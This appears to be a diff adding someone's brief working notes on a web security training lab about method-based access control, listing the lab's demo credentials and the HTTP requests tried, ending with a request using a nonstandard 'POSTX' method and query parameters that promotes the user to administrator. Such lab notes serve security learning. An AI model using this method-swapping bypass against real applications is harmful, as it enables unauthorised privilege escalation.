@@ -1,0 +1,25 @@
+Lab: Method-based access control can be circumvented
+
+ This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+
+
+GET /admin HTTP/2
+
+POST /admin-roles HTTP/2
+
+username=carlos&action=downgrade
+
+username=carlos&action=upgrade
+
+X-Original-URL: /admin dont work
+
+lets try copying the POST /admin-roles HTTP/2
+
+No authoriced so we try with POSTX
+POSTX admin-roles HTTP/2
+
+now is asking for user and actio so 
+
+POSTX /admin-roles?username=wiener&action=upgrade HTTP/2
